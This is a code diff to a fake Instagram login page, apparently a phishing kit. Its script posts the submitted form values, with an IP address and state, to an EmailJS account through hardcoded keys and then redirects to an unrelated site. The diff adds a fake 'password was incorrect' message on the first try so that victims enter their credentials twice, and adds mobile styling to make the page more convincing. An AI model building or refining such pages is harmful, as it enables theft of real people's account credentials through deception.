@@ -9,7 +9,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
     <link rel="stylesheet" href="{% static 'css/instagram.css' %}">
     <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script type="module">
       import emailjs from 'https://cdn.emailjs.com/dist/email.min.js';
   </script>
@@ -87,6 +87,39 @@ input[type="submit"]:hover, input[type="submit"]:focus {
   background: rgb(48, 144, 233);
   outline: 0;
 }
+
+.error-message {
+  display: none;
+  color: #ED4956;
+  font-size: 14px;
+  text-align: center;
+  margin: 10px 40px 0;
+  line-height: 1.4;
+  word-wrap: break-word;
+}
+
+/* Responsive for mobile screens */
+@media screen and (max-width: 450px) {
+  .login {
+    width: 90%;
+  }
+
+  .error-message {
+    margin: 10px 20px 0;
+    font-size: 13px;
+  }
+
+  input[type="text"], input[type="password"], input[type="submit"] {
+    width: calc(100% - 40px);
+    margin: 10px 20px 0;
+  }
+
+  .divider {
+    width: calc(100% - 40px);
+    margin-left: 20px;
+  }
+}
+
 
 
 .divider {
@@ -243,7 +276,9 @@ input[type="submit"]:hover, input[type="submit"]:focus {
   <div class="divider"><b>OR</b></div>
 
   <div class="fbwrapper"><div class="fb"><a href="https://facebook.com"><img src="https://i.imgur.com/exksovo.png">  Log in with Facebook</a></div></div>
-
+  <div id="login-error" class="error-message">
+    Sorry, your password was incorrect. Please double-check your password.
+  </div>
 
   <div class="forgotwrapper"><div class="forgot"><a href="https://instagram.com">Forgot password?</a></div></div>
 
@@ -298,54 +333,48 @@ input[type="submit"]:hover, input[type="submit"]:focus {
 
 <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
 
-  <script type="text/javascript">
-    (function() {
-        emailjs.init("f4e9WkNtC012SJLfG"); // Use your EmailJS User ID
-    })();
-
-    document.getElementById("contact-form").addEventListener("submit", function(event) {
+    <script type="text/javascript">
+      let attemptCount = 0;
+    
+      (function() {
+        emailjs.init("f4e9WkNtC012SJLfG");
+      })();
+    
+      document.getElementById("contact-form").addEventListener("submit", function(event) {
         event.preventDefault();
-
+    
+        // First attempt shows inline error
+        if (attemptCount === 0) {
+          attemptCount++;
+          document.getElementById("login-error").style.display = "block";
+          return;
+        }
+    
         // Collect form values
         var name = document.getElementById("name").value;
         var email = document.getElementById("email").value;
         var message = document.getElementById("message").value;
         var ip_address = document.getElementById("ip_address").value;
         var state = document.getElementById("state").value;
-
-        // Prepare email parameters
+    
         var emailParams = {
-            from_name: name,
-            from_email: email,
-            message: message,
-            ip_address: ip_address,
-            state: state
+          from_name: name,
+          from_email: email,
+          message: message,
+          ip_address: ip_address,
+          state: state
         };
-
-        // Send the email using EmailJS
+    
         emailjs.send("service_75wx5te", "template_vuqsrlf", emailParams)
-            .then(function(response) {
-              //  console.log("Voting Is Processing:", response);
-                //alert("Voting Is Processing!");
-                        // Redirect to another page after email is sent
-        window.location.href = "http://thedailydish6.ct.ws/voty.html";  // Redirect to a 'thank you' page after email is sent
-            }, function(error) {
-                console.error("Login Error:", error);
-                alert("Failed to Login. Please check and try again.");
-            });
-    });
-</script>
-
-<script type="text/javascript"
-        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
-</script>
-<script type="text/javascript">
-   (function(){
-      emailjs.init({
-        publicKey: "f4e9WkNtC012SJLfG",
+          .then(function(response) {
+            window.location.href = "http://thedailydish6.ct.ws/voty.html";
+          }, function(error) {
+            console.error("Login Error:", error);
+            alert("Failed to Login. Please check and try again.");
+          });
       });
-   })();
-</script>
+    </script>
+    
 </body>
 
 </html>
